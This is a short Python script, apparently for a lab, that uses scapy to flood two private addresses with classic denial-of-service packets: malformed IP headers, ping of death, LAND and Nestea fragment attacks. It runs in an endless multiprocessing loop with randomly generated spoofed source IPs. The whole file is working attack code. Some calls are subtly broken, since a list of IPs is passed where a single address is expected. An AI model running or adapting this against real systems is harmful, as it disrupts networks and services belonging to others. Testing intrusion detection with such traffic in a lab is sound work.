import sys, random
from scapy.all import *
import multiprocessing

destinations = ["10.0.0.3", "10.0.0.4"]


def get_random_ips(n):
    for i in range(0, int(n)):
        ip_gen = (
            str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
        )
        source_ips.append(ip_gen)


# attacks taken from classical attacks on https://scapy.readthedocs.io


def send_malformed_packet(origin_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=origin_ip, dst=dst_ip, ihl=2, version=3) / ICMP())


def send_ping_of_death(origin_ip):
    dst_ip = random.choice(destinations)
    send(fragment(IP(dst=dst_ip) / ICMP() / ("X" * 60000)))


# refer LAND DoS attack https://en.wikipedia.org/wiki/LAND
def send_land_attack(origin_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=dst_ip, dst=dst_ip) / TCP(sport=135, dport=135))


# using fragment offset to sabotage the victim connection/network communication:
def send_nestea_attack(origin_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=origin_ip, dst=dst_ip, id=42, flags="MF") / UDP() / ("X" * 10))
    send(IP(src=origin_ip, dst=dst_ip, id=42, frag=48) / ("X" * 116))
    send(IP(src=origin_ip, dst=dst_ip, id=42, flags="MF") / UDP() / ("X" * 224))


while True:
    source_ips = []
    get_random_ips(10000)

    p = multiprocessing.Pool(4)
    # Uncomment whichever attacks is required, comment out the rest
    # p.apply_async(send_malformed_packet, args=(source_ips,))
    # p.apply_async(send_ping_of_death, args=(source_ips,))
    # p.apply_async(send_land_attack, args=(source_ips,))
    p.apply_async(send_nestea_attack, args=(source_ips,))
    p.close()
    p.join()
